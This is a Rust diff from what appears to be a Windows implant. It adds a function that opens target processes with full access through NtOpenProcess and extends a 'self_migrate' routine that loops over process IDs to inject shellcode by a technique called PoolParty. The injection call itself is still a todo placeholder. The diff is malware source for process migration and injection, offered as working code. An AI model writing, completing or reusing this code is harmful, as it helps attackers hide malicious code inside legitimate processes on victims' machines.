@@ -132,6 +132,40 @@ unsafe fn find_processes_by_hash(target_hash: u32, required_session: u32) -> [us
     result
 }}
 
+unsafe fn open_process(pid: usize) -> Option<HANDLE> {
+    let mut handle: HANDLE = null_mut();
+
+    let mut client_id = ClientID {
+        unique_process: pid as HANDLE,
+        unique_thread: null_mut(),
+    };
+
+    let mut obj_attr: ObjectAttributes = core::mem::zeroed();
+    initialize_object_attributes(
+        &mut obj_attr,
+        null_mut(),
+        0,
+        null_mut(),
+        null_mut(),
+    );
+
+    let status = nt::nt_open_process(
+        &mut handle,
+        0x001FFFFF,
+        &mut obj_attr,
+        &mut client_id,
+    );
+
+    if status == STATUS_SUCCESS && !handle.is_null() {
+        Some(handle) 
+    } else {
+        debug!("[MIGRATE] NtOpenProcess failed: 0x{:08X}", status);
+        None
+    }
+}
+
+
+
 pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
     if sehllcode.is_empty() {
         debug!("[MIGRATE] No Shellcode to inject");
@@ -146,7 +180,25 @@ pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
             debug!("[MIGRATE]   #{} - not found or worng session", idx);
             continue;
         }
-    }
     
+        // Try each  PID of this proces type
+        for &pid in pids.iter().filter(|&&p| p != 0) {
+            debug!("[MIGRATE]   Attempting PID {}", pid);
+
+            let handle = match open_process(pid) {
+                Some(h) => h,
+                None => {
+                    debug!("[MIGRATE]   Failed to open PID {}", pid);
+                    continue;
+                }
+            };
+
+            // TODO: PoolParty + MirrorGate
+            debug!("[MIGRATE] Injecting via PoolParty into PID {}", pid);
+            let success = todo!();
+
+        }
+    }
+
     true
 }}
